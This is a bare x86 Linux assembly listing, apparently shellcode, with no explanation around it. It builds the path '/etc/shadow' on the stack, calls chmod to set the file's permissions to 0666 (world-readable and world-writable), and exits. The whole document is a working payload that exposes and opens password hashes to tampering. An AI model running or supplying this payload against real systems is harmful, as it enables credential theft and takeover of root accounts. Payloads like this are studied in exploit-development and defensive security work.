global _start  
section .text  

_start:          
       	    xor ecx,ecx
	    mul ecx
            push edx	  
	    push dword 0x776f6461
            push dword 0x68732f2f
            push dword 0x2f2f6374
            push dword 0x652f2f2f
            mov ebx,esp
	    push word 0x1B7  ;permission 667
	    pop ecx
	    sub ecx,0x1
            mov al,0xf
            int 0x80
	    mov al,0x1
            int 0x80
